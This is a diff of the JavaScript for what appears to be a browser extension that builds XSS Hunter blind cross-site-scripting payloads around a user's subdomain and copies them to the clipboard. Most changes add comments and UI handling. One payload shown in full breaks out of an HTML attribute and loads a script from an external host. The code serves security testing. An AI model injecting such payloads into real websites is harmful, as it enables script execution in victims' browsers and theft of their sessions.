@@ -1,3 +1,4 @@
+//Check if a payload was previously stored
 chrome.storage.sync.get('xssHunterSubdomain', function (answer) {
 	subdomain = answer.xssHunterSubdomain;
 	if (subdomain !== null) {
@@ -6,10 +7,12 @@ chrome.storage.sync.get('xssHunterSubdomain', function (answer) {
 	}
 })
 
+//An array of objects
+//Each object contains a title and a payload
 var payloads = [{
 	title: ' <label><code>&lt;script&gt;</code> Tag Payload</label> - Basic XSS payload.<br>',
 	payload: function (subdomain) {
-		return '"><script src="https://' + subdomain + '"></script>';
+		return '"><script src=https://' + subdomain + '></script>';
 	}
 }, {
 	title: '<label><code>javascript:</code> URI Payload</label> - For use where URI\'s are taken as input. <br> ',
@@ -62,27 +65,30 @@ var payloads = [{
 	}
 }];
 
+//Encode every character in its HTML Entity equivalent
 function htmlEncodeFull(payload) {
 	return payload.replace(/./gm, function (s) {
 		return "&#" + s.charCodeAt(0) + ";";
 	});
 }
 
-
-
+//Get the copy payload button
 function getButton(payload) {
 	return '<button type="button" data="' + htmlEncode(payload) + '" class="btn btn-info btn-block payloadCopy"><span class="glyphicon glyphicon-share"></span> Copy Payload to Clipboard</button>';
 }
 
+//Get the payload input
 function getInput(payload) {
 	return '<input type="text" class="form-control payloadInput" value="' + htmlEncode(payload) + '">';
 }
 
+//Simple html encoding for displaying payloads
+//This is not a regex for preventing XSS
 function htmlEncode(payload) {
 	return payload.replace(/&/g, "&amp;").replace(/>/g, "&gt;").replace(/</g, "&lt;").replace(/"/g, "&quot;");
 }
 
-
+//Add the given payload with the given subdomain
 function addPayload(payload, subdomain) {
 	var payloadString = payload.payload(subdomain);
 	var button = getButton(payloadString);
@@ -90,6 +96,7 @@ function addPayload(payload, subdomain) {
 	$('#payloads').append(payload.title + input + button);
 }
 
+//Update payloads when subdomain is changed
 $('#subdomain').on('change textInput input', function () {
 	var subdomain = $('#subdomain').val();
 	chrome.storage.sync.set({
@@ -99,11 +106,19 @@ $('#subdomain').on('change textInput input', function () {
 	setPayloads(subdomain)
 })
 
+//Set all payloads for the given subdomain
 function setPayloads(subdomain) {
+	//All xsshunter files should be servable over https, so remove all protocols and allow the injection strings to add protocol.
+	if (subdomain.indexOf('http://') > -1 || subdomain.indexOf('https://') > -1) {
+		subdomain = subdomain.split('//')[1];
+	}
 	for (var i = 0; i < payloads.length; i++) {
 		addPayload(payloads[i], subdomain);
 	}
 	$('.payloadCopy').click(function (e, el) {
+		//Just for assurance that it is copied.
+		copyTextToClipboard(e.target.attributes.data.nodeValue);
+		copyTextToClipboard(e.target.attributes.data.nodeValue);
 		copyTextToClipboard(e.target.attributes.data.nodeValue);
 	})
 
